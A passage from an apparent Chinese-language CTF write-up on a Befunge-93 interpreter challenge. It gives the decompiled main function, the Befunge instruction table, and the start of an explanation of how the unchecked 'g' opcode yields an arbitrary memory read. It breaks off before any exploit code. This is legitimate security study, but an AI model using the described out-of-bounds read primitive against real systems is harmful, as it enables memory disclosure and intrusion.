</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// rbp
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// rcx
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// rax
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// di
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// dl
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// rdi
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// eax
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// r14
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// rdi
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// r14
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v13</span><span class="p">;</span> <span class="c1">// rdi
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v14</span><span class="p">;</span> <span class="c1">// r14
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v15</span><span class="p">;</span> <span class="c1">// rdi
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v16</span><span class="p">;</span> <span class="c1">// r14
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v17</span><span class="p">;</span> <span class="c1">// rdi
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v18</span><span class="p">;</span> <span class="c1">// r14
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v19</span><span class="p">;</span> <span class="c1">// rdi
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v20</span><span class="p">;</span> <span class="c1">// r14
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v21</span><span class="p">;</span> <span class="c1">// rax
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v22</span><span class="p">;</span> <span class="c1">// rax
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v23</span><span class="p">;</span> <span class="c1">// r14
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v24</span><span class="p">;</span> <span class="c1">// r15
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v25</span><span class="p">;</span> <span class="c1">// r14
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v26</span><span class="p">;</span> <span class="c1">// r14
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v27</span><span class="p">;</span> <span class="c1">// rax
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v28</span><span class="p">;</span> <span class="c1">// r15
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v29</span><span class="p">;</span> <span class="c1">// r14
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v30</span><span class="p">;</span> <span class="c1">// eax
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">step</span><span class="p">;</span> <span class="c1">// ebx
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v33</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-9Ch] BYREF
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-98h] BYREF
</span><span class="c1"></span>  <span class="kr">__int16</span> <span class="n">v35</span><span class="p">;</span> <span class="c1">// [rsp+60h] [rbp-48h]
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v36</span><span class="p">;</span> <span class="c1">// [rsp+68h] [rbp-40h]
</span><span class="c1"></span>
  <span class="n">v36</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">alarm</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">__sysv_signal</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span> <span class="n">handler</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Welcome to Online Befunge(93) Interpreter&#34;</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Please input your program.&#34;</span><span class="p">);</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="n">program</span><span class="p">;</span>
  <span class="k">do</span>
  <span class="p">{</span>
    <span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="s">&#34;&gt; &#34;</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">s</span><span class="p">));</span>
    <span class="n">v35</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">82</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">v4</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v33</span> <span class="o">+</span> <span class="n">v4</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
        <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v33</span> <span class="o">+</span> <span class="n">v4</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span> <span class="n">i</span> <span class="o">!=</span> <span class="mi">80</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
      <span class="n">v3</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
    <span class="n">v3</span> <span class="o">+=</span> <span class="mi">80</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">while</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">program</span><span class="p">[</span><span class="mi">2000</span><span class="p">]</span> <span class="p">);</span>
  <span class="n">step</span> <span class="o">=</span> <span class="mi">10001</span><span class="p">;</span>
  <span class="k">do</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">string_mode</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">v6</span> <span class="o">=</span> <span class="n">program</span><span class="p">[</span><span class="mi">80</span> <span class="o">*</span> <span class="n">y_offset</span> <span class="o">+</span> <span class="n">x_offset</span><span class="p">];</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">==</span> <span class="mi">34</span> <span class="p">)</span>
        <span class="n">string_mode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="k">else</span>
        <span class="n">push</span><span class="p">(</span><span class="n">v6</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">bridge</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">v7</span> <span class="o">=</span> <span class="n">program</span><span class="p">[</span><span class="mi">80</span> <span class="o">*</span> <span class="n">y_offset</span> <span class="o">+</span> <span class="n">x_offset</span><span class="p">];</span>
      <span class="k">switch</span> <span class="p">(</span> <span class="n">v7</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="k">case</span> <span class="sc">&#39; &#39;</span><span class="o">:</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;!&#39;</span><span class="o">:</span>
          <span class="n">v22</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
          <span class="n">push</span><span class="p">(</span><span class="n">v22</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;&#34;&#39;</span><span class="o">:</span>
          <span class="n">string_mode</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;#&#39;</span><span class="o">:</span>
          <span class="n">bridge</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;$&#39;</span><span class="o">:</span>
          <span class="n">pop</span><span class="p">();</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;%&#39;</span><span class="o">:</span>
          <span class="n">v18</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
          <span class="n">v19</span> <span class="o">=</span> <span class="n">pop</span><span class="p">()</span> <span class="o">%</span> <span class="n">v18</span><span class="p">;</span>
          <span class="n">push</span><span class="p">(</span><span class="n">v19</span><span class="p">);</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;&amp;&#39;</span><span class="o">:</span>
          <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v33</span><span class="p">);</span>
          <span class="n">push</span><span class="p">(</span><span class="n">v33</span><span class="p">);</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;*&#39;</span><span class="o">:</span>
          <span class="n">v14</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
          <span class="n">v15</span> <span class="o">=</span> <span class="n">v14</span> <span class="o">*</span> <span class="n">pop</span><span class="p">();</span>
          <span class="n">push</span><span class="p">(</span><span class="n">v15</span><span class="p">);</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;+&#39;</span><span class="o">:</span>
          <span class="n">v10</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
          <span class="n">v11</span> <span class="o">=</span> <span class="n">pop</span><span class="p">()</span> <span class="o">+</span> <span class="n">v10</span><span class="p">;</span>
          <span class="n">push</span><span class="p">(</span><span class="n">v11</span><span class="p">);</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;,&#39;</span><span class="o">:</span>
          <span class="n">v9</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
          <span class="n">_IO_putc</span><span class="p">(</span><span class="n">v9</span><span class="p">,</span> <span class="n">stdout</span><span class="p">);</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;-&#39;</span><span class="o">:</span>
          <span class="n">v12</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
          <span class="n">v13</span> <span class="o">=</span> <span class="n">pop</span><span class="p">()</span> <span class="o">-</span> <span class="n">v12</span><span class="p">;</span>
          <span class="n">push</span><span class="p">(</span><span class="n">v13</span><span class="p">);</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;.&#39;</span><span class="o">:</span>
          <span class="n">pop</span><span class="p">();</span>
          <span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">off_12F0</span><span class="p">);</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;/&#39;</span><span class="o">:</span>
          <span class="n">v16</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
          <span class="n">v17</span> <span class="o">=</span> <span class="n">pop</span><span class="p">()</span> <span class="o">/</span> <span class="n">v16</span><span class="p">;</span>
          <span class="n">push</span><span class="p">(</span><span class="n">v17</span><span class="p">);</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;:&#39;</span><span class="o">:</span>
          <span class="n">v23</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
          <span class="n">push</span><span class="p">(</span><span class="n">v23</span><span class="p">);</span>
          <span class="n">push</span><span class="p">(</span><span class="n">v23</span><span class="p">);</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;&lt;&#39;</span><span class="o">:</span>
          <span class="n">move</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;&gt;&#39;</span><span class="o">:</span>
          <span class="n">move</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;@&#39;</span><span class="o">:</span>
          <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
          <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Program exited&#34;</span><span class="p">);</span>
          <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        <span class="k">case</span> <span class="sc">&#39;\\&#39;</span><span class="o">:</span>
          <span class="n">v24</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
          <span class="n">v25</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
          <span class="n">push</span><span class="p">(</span><span class="n">v24</span><span class="p">);</span>
          <span class="n">push</span><span class="p">(</span><span class="n">v25</span><span class="p">);</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;^&#39;</span><span class="o">:</span>
          <span class="n">move</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;_&#39;</span><span class="o">:</span>
          <span class="n">move</span> <span class="o">=</span> <span class="n">pop</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">?</span> <span class="mi">2</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;`&#39;</span><span class="o">:</span>
          <span class="n">v20</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
          <span class="n">v21</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
          <span class="n">push</span><span class="p">(</span><span class="n">v21</span> <span class="o">&gt;</span> <span class="n">v20</span><span class="p">);</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;g&#39;</span><span class="o">:</span>
          <span class="n">v26</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
          <span class="n">v27</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
          <span class="n">push</span><span class="p">(</span><span class="n">program</span><span class="p">[</span><span class="mi">80</span> <span class="o">*</span> <span class="n">v26</span> <span class="o">+</span> <span class="n">v27</span><span class="p">]);</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;p&#39;</span><span class="o">:</span>
          <span class="n">v28</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
          <span class="n">v29</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
          <span class="n">program</span><span class="p">[</span><span class="mi">80</span> <span class="o">*</span> <span class="n">v28</span> <span class="o">+</span> <span class="n">v29</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop</span><span class="p">();</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;v&#39;</span><span class="o">:</span>
          <span class="n">move</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;|&#39;</span><span class="o">:</span>
          <span class="n">move</span> <span class="o">=</span> <span class="n">pop</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="mi">3</span><span class="p">;</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;~&#39;</span><span class="o">:</span>
          <span class="n">v8</span> <span class="o">=</span> <span class="n">_IO_getc</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
          <span class="n">push</span><span class="p">(</span><span class="n">v8</span><span class="p">);</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="k">default</span><span class="o">:</span>
          <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)(</span><span class="n">v7</span> <span class="o">-</span> <span class="mi">48</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">9u</span> <span class="p">)</span>
            <span class="n">push</span><span class="p">(</span><span class="n">v7</span> <span class="o">-</span> <span class="mi">48</span><span class="p">);</span>
          <span class="k">break</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="o">--</span><span class="n">bridge</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">y_offset</span> <span class="o">+=</span> <span class="n">dword_14E0</span><span class="p">[</span><span class="n">move</span><span class="p">];</span>
    <span class="n">v30</span> <span class="o">=</span> <span class="n">x_offset</span> <span class="o">+</span> <span class="n">dword_14F0</span><span class="p">[</span><span class="n">move</span><span class="p">];</span>
    <span class="n">x_offset</span> <span class="o">=</span> <span class="n">v30</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">y_offset</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">y_offset</span> <span class="o">=</span> <span class="mi">24</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">y_offset</span> <span class="o">==</span> <span class="mi">25</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">y_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v30</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">x_offset</span> <span class="o">=</span> <span class="mi">79</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">x_offset</span> <span class="o">==</span> <span class="mi">80</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">x_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="o">--</span><span class="n">step</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">while</span> <span class="p">(</span> <span class="n">step</span> <span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Too many steps. Is there any infinite loops?&#34;</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>程序是一个<code>befunge-93</code>的解释器，<code>befunge</code>的程序布局是一个二维的平面，如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">      <span class="n">Befunge</span><span class="o">-</span><span class="mi">93</span>                
      <span class="o">==========</span>       
   <span class="mi">0</span>      <span class="n">x</span>     <span class="mi">79</span>                    
  <span class="mi">0</span><span class="o">+-------------+</span>                   
   <span class="o">|</span>                                
   <span class="o">|</span>                            
  <span class="n">y</span><span class="o">|</span>                  
   <span class="o">|</span>                                    
   <span class="o">|</span>                               
 <span class="mi">24</span><span class="o">+</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="befunge-93-instruction-listhttpsenwikipediaorgwikibefunge"><a href="https://en.wikipedia.org/wiki/Befunge" target="_blank" rel="noopener noreffer">Befunge-93 instruction list</a></h3>
<table>
<thead>
<tr>
<th style="text-align:center"><code>0-9</code></th>
<th style="text-align:center">Push this number on the stack</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>+</code></td>
<td style="text-align:center">Addition: Pop <em>a</em> and <em>b</em>, then push <em>a</em>+<em>b</em></td>
</tr>
<tr>
<td style="text-align:center"><code>-</code></td>
<td style="text-align:center">Subtraction: Pop <em>a</em> and <em>b</em>, then push <em>b</em>-<em>a</em></td>
</tr>
<tr>
<td style="text-align:center"><code>*</code></td>
<td style="text-align:center">Multiplication: Pop <em>a</em> and <em>b</em>, then push <em>a</em>*<em>b</em></td>
</tr>
<tr>
<td style="text-align:center"><code>/</code></td>
<td style="text-align:center">Integer division: Pop <em>a</em> and <em>b</em>, then push <em>b</em>/<em>a</em>, rounded towards 0.</td>
</tr>
<tr>
<td style="text-align:center"><code>%</code></td>
<td style="text-align:center">Modulo: Pop <em>a</em> and <em>b</em>, then push the remainder of the integer division of <em>b</em>/<em>a</em>.</td>
</tr>
<tr>
<td style="text-align:center"><code>!</code></td>
<td style="text-align:center">Logical NOT: Pop a value. If the value is zero, push 1; otherwise, push zero.</td>
</tr>
<tr>
<td style="text-align:center">```</td>
<td style="text-align:center">Greater than: Pop <em>a</em> and <em>b</em>, then push 1 if <em>b</em>&gt;<em>a</em>, otherwise zero.</td>
</tr>
<tr>
<td style="text-align:center"><code>&gt;</code></td>
<td style="text-align:center">Start moving right</td>
</tr>
<tr>
<td style="text-align:center"><code>&lt;</code></td>
<td style="text-align:center">Start moving left</td>
</tr>
<tr>
<td style="text-align:center"><code>^</code></td>
<td style="text-align:center">Start moving up</td>
</tr>
<tr>
<td style="text-align:center"><code>v</code></td>
<td style="text-align:center">Start moving down</td>
</tr>
<tr>
<td style="text-align:center"><code>?</code></td>
<td style="text-align:center">Start moving in a random cardinal direction</td>
</tr>
<tr>
<td style="text-align:center"><code>_</code></td>
<td style="text-align:center">Pop a value; move right if value=0, left otherwise</td>
</tr>
<tr>
<td style="text-align:center">`</td>
<td style="text-align:center">`</td>
</tr>
<tr>
<td style="text-align:center"><code>&quot;</code></td>
<td style="text-align:center">Start string mode: push each character&rsquo;s ASCII value all the way up to the next <code>&quot;</code></td>
</tr>
<tr>
<td style="text-align:center"><code>:</code></td>
<td style="text-align:center">Duplicate value on top of the stack</td>
</tr>
<tr>
<td style="text-align:center"><code>\</code></td>
<td style="text-align:center">Swap two values on top of the stack</td>
</tr>
<tr>
<td style="text-align:center"><code>$</code></td>
<td style="text-align:center">Pop value from the stack and discard it</td>
</tr>
<tr>
<td style="text-align:center"><code>.</code></td>
<td style="text-align:center">Pop value and output as an integer followed by a space</td>
</tr>
<tr>
<td style="text-align:center"><code>,</code></td>
<td style="text-align:center">Pop value and output as ASCII character</td>
</tr>
<tr>
<td style="text-align:center"><code>#</code></td>
<td style="text-align:center">Bridge: Skip next cell</td>
</tr>
<tr>
<td style="text-align:center"><code>p</code></td>
<td style="text-align:center">A &ldquo;put&rdquo; call (a way to store a value for later use). Pop <em>y</em>, <em>x</em>, and <em>v</em>, then change the character at (<em>x</em>,<em>y</em>) in the program to the character with ASCII value <em>v</em></td>
</tr>
<tr>
<td style="text-align:center"><code>g</code></td>
<td style="text-align:center">A &ldquo;get&rdquo; call (a way to retrieve data in storage). Pop <em>y</em> and <em>x</em>, then push ASCII value of the character at that position in the program</td>
</tr>
<tr>
<td style="text-align:center"><code>&amp;</code></td>
<td style="text-align:center">Ask user for a number and push it</td>
</tr>
<tr>
<td style="text-align:center"><code>~</code></td>
<td style="text-align:center">Ask user for a character and push its ASCII value</td>
</tr>
<tr>
<td style="text-align:center"><code>@</code></td>
<td style="text-align:center">End program</td>
</tr>
<tr>
<td style="text-align:center"><code>    </code>(space)</td>
<td style="text-align:center">No-op. Does nothing</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p>利用<code>&amp;</code>，<code>g</code>和<code>,</code>的功能，我们有办法做到任意读。</p>
<ul>
<li>先通过&amp;将x跟ypush到Stack上，x与y我们可控（32位整数）</li>
<li>这边注意stack是程序在bss段自行模拟出来的一块，拥有类似的堆栈行为，并不是指程式真正的堆栈。
<code>g</code>的功能是将<code>program[80 * x + y]</code>的内容<code>push</code>到Stack上。因为x与y我们可控，代表着我们可以将任意位址的内容push到Stack上。
<code>,</code> 弹出stack顶端的值（可控）pop出来（1 byte），并印出他的数值。</li>
</ul>
</li>
<li>
